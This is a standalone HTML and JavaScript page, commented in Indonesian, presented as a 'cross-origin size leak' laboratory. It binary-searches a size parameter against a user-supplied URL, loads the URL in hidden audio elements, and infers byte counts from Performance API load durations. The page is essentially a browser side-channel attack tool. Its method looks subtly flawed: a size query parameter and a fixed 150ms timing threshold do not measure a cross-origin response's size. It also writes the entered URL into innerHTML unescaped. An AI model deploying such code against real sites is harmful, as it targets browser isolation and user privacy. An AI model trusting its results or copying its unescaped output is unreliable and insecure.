<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Cross-Origin Size Leak Laboratory</title>
    <style>
        *{font-family:Mukta,sans-serif;color:#3b3b3b;box-sizing:border-box;}
        body{background:#0a0a0c;color:#00ffaa;padding:20px;}
        input{background:inherit}
        #result{max-width:720px;overflow-y:hidden;overflow-x:hidden}
        #result p{font-weight:300;padding:8px 12px;margin:5px;max-width:700px;border-radius:4px;}
        iframe, audio{width:1px;height:1px;border:0;opacity:0;position:absolute;}
        small{color:gray;font-weight:400;font-style:italic;font-size:16px;margin-top:-5px;display:block;margin-bottom:30px}
        small strong{font-weight:600;font-size:18px;color:#00ffaa}
        input{width:515px;font-size:18px;padding:10px 14px;border:1px solid #00ffaa;border-radius:6px;margin:3px;margin-left:0;background:#111;color:#fff;}
        button{font-size:18px;padding:10px 14px;border-radius:6px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;margin:3px;margin-left:0;margin-bottom:20px;font-weight:bold;}
        button:hover{background:#00ffaa;color:#000;box-shadow:0 0 10px #00ffaa;}
        h1{margin-top:20px;color:#00ffaa;text-transform:uppercase;letter-spacing:1px;}
        .panel{border:1px solid #00ffaa;padding:15px;margin-bottom:15px;background:#010604;border-radius:6px;}
        .success{background:#05140f;color:#00ffaa;border:1px solid #00ffaa;}
        .error{background:#1f0f0f;color:#ff3333;border:1px solid #ff3333;}
        .msg{font-weight:600;color:inherit;}
    </style>
</head>
<body>
    
    <h1>Cross-origin size leak</h1>
    <small>Compatible with <strong>GitHub Pages & Chrome</strong> - Pure Timing Engine</small>

    <div class="panel">
        <form id="form" method="POST">
          <input name="url" placeholder="https://google.com" value="https://google.com"/>
          <button type="submit">Run Search Chain</button>
          <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Audit Report (.TXT)</button>
        </form>
    </div>

    <div id="result"></div>

    <script>
        const result = document.getElementById("result");
        const form = document.getElementById("form");
        let auditReports = []; 

        const binarySearchSize = async (url, minSize, maxSize) => {
            let foundSize = -1;
            document.getElementById("export-log-report").style.display = "none";
            writeMsg(url, "success", `Memulai komputasi pipa biner berbasis Pure Network Timing...`);
            
            while (minSize <= maxSize) {
                let mid = Math.floor((minSize + maxSize) / 2);
                
                // Eksekusi asinkron sekuensial mengukur latensi pemuatan media
                let isAtLeastMid = await checkSizeThroughTimingAPI(url, mid);
                
                if (isAtLeastMid) {
                    foundSize = mid + 1;
                    minSize = mid + 1;
                } else {
                    maxSize = mid - 1;
                }
                
                // Jeda mikro memberikan kesempatan mesin browser melakukan garbage collection memori
                await new Promise(r => setTimeout(r, 30));
            }
            writeMsg(url, "success", `Rantai Pipa Selesai: Kapasitas dokumen terisolasi -> <b>${foundSize}</b> bytes.`);
            document.getElementById("export-log-report").style.display = "inline-block";
        };

        // STRATEGI PENGUATAN: Pencatatan Durasi via Performance API (Bypass Ketergantungan Service Worker)
        const checkSizeThroughTimingAPI = (url, size) => {
            return new Promise((resolve) => {
                const uniqueString = `cb_${Math.round(Math.random() * 1000000)}`;
                const targetUrl = `${url}?size=${size}&${uniqueString}`;
                
                let sound = document.createElement("audio");
                
                const processTimingMetrics = () => {
                    // Mengekstrak metrik performa pemuatan objek langsung dari memori internal peramban
                    const entries = performance.getEntriesByName(targetUrl);
                    
                    if (entries.length > 0) {
                        const duration = entries[0].duration;
                        // Side-Channel Rule: Respons di bawah ambang batas mengonfirmasi indikasi ukuran byte yang cocok
                        if (duration < 150) {
                            writeMsg(url, "error", `Analisis Vektor: Tidak mengandung kapasitas ukuran <b>${size - 1}</b> bytes [Respon: ${Math.round(duration)}ms].`);
                            cleanup(sound);
                            resolve(false);
                            return;
                        }
                    }
                    
                    cleanup(sound);
                    resolve(true);
                };

                // Mengikat penanganan untuk memastikan metrik jaringan ditangkap saat pemuatan berhenti
                sound.onerror = processTimingMetrics;
                sound.onstalled = processTimingMetrics;
                sound.onabort = processTimingMetrics;
                
                document.body.appendChild(sound);
                sound.src = targetUrl;
            });
        };

        function cleanup(element) {
            if (element) {
                element.src = "";
                element.onerror = null;
                element.onstalled = null;
                element.onabort = null;
                element.remove();
            }
        }

        const writeMsg = (url, status, message) => {
            const timestamp = new Date().toLocaleTimeString();
            auditReports.push(`[${timestamp}] [${status.toUpperCase()}] Resource on ${url} ${message.replace(/<[^>]*>/g, '')}`);
            
            result.innerHTML += `<p class="${status}">Resource on <span class="msg">${url}</span> ${message}</p>`;
            result.scrollTop = result.scrollHeight;
        };

        form.onsubmit = async (e) => {
            e.preventDefault();
            let url = form.url.value.trim();
            let minSize = 1;
            let maxSize = 10000;
            auditReports = []; 
            // Bersihkan entri performa lama agar penghitungan timing mulai dari nol
            performance.clearResourceTimings();
            binarySearchSize(url, minSize, maxSize);
        };

        // LAYANAN EKSPOR LAPORAN AUDIT LABORATORIUM
        document.getElementById("export-log-report").addEventListener("click", () => {
            if (auditReports.length === 0) return;
            
            const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
            const downloadAnchor = document.createElement("a");
            
            downloadAnchor.download = `size_leak_timing_audit_${Math.round(Date.now()/1000)}.txt`;
            downloadAnchor.href = window.URL.createObjectURL(textBlob);
            downloadAnchor.style.display = "none";
            
            document.body.appendChild(downloadAnchor);
            downloadAnchor.click();
            downloadAnchor.remove();
        });
    </script>
</body>
</html>
